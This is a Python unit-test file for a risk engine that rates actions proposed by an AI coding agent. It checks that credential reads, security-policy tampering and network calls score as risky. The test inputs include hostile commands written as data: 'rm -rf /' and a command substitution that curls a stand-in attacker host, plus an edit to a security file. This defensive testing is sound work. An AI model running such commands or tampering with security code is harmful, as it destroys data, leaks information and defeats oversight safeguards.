# tests/test_risk_engine.py
"""
Unit tests for Prompt 13 Risk Engine (14 Risk Dimensions, Path Traversal, Security Tampering).
"""

import pytest
from core.security.enums import RiskDimension, RiskLevel
from core.security.models import ActionDescriptor, UserIntent
from core.security.risk import RiskEngine, redact_sensitive_text


@pytest.fixture
def risk_engine():
    return RiskEngine()


def test_safe_read_only_action(risk_engine):
    action = ActionDescriptor(
        tool_name="view_file",
        arguments={"path": "src/components/Header.tsx"},
        is_read_only=True,
        canonical_path="c:/workspace/src/components/Header.tsx",
    )
    assessment = risk_engine.assess_action(action)
    assert assessment.level == RiskLevel.SAFE
    assert assessment.score <= 0.2


def test_sensitive_credential_file_access(risk_engine):
    action = ActionDescriptor(
        tool_name="view_file",
        arguments={"path": ".env"},
        is_read_only=True,
        canonical_path="c:/workspace/.env",
    )
    assessment = risk_engine.assess_action(action)
    assert assessment.level in (RiskLevel.HIGH, RiskLevel.CRITICAL)
    assert RiskDimension.CREDENTIAL in assessment.dimensions


def test_security_tampering_is_critical(risk_engine):
    # Proposing to overwrite security code or policy
    action = ActionDescriptor(
        tool_name="write_file",
        arguments={"path": "core/security/policy.py", "content": "# bypass"},
        is_read_only=False,
        canonical_path="c:/workspace/core/security/policy.py",
    )
    assessment = risk_engine.assess_action(action)
    assert assessment.level == RiskLevel.CRITICAL
    assert RiskDimension.SECURITY_TAMPERING in assessment.dimensions


def test_destructive_shell_command(risk_engine):
    action = ActionDescriptor(
        tool_name="run_command",
        arguments={"command": "rm -rf /"},
        is_read_only=False,
        command_str="rm -rf /",
    )
    assessment = risk_engine.assess_action(action)
    assert assessment.level == RiskLevel.CRITICAL
    assert RiskDimension.DESTRUCTIVE in assessment.dimensions


def test_hidden_command_substitution(risk_engine):
    action = ActionDescriptor(
        tool_name="run_command",
        arguments={"command": "echo $(curl -s http://attacker.com/leak)"},
        is_read_only=False,
        command_str="echo $(curl -s http://attacker.com/leak)",
    )
    assessment = risk_engine.assess_action(action)
    assert assessment.level in (RiskLevel.HIGH, RiskLevel.CRITICAL)
    assert RiskDimension.COMMAND_EXECUTION in assessment.dimensions


def test_external_untrusted_network_call(risk_engine):
    action = ActionDescriptor(
        tool_name="read_url_content",
        arguments={"url": "http://malicious-external-site.com/exploit"},
        is_read_only=True,
        target_url="http://malicious-external-site.com/exploit",
    )
    assessment = risk_engine.assess_action(action)
    assert assessment.level in (RiskLevel.MEDIUM, RiskLevel.HIGH)
    assert RiskDimension.NETWORK in assessment.dimensions


def test_sensitive_text_redaction():
    text = "Authorization: Bearer sk-ant-1234567890abcdef1234567890 and secret=mySuperSecretPass123"
    redacted = redact_sensitive_text(text)
    assert "sk-ant-" not in redacted
    assert "mySuperSecretPass123" not in redacted
    assert "[REDACTED_SECRET]" in redacted or "[REDACTED]" in redacted
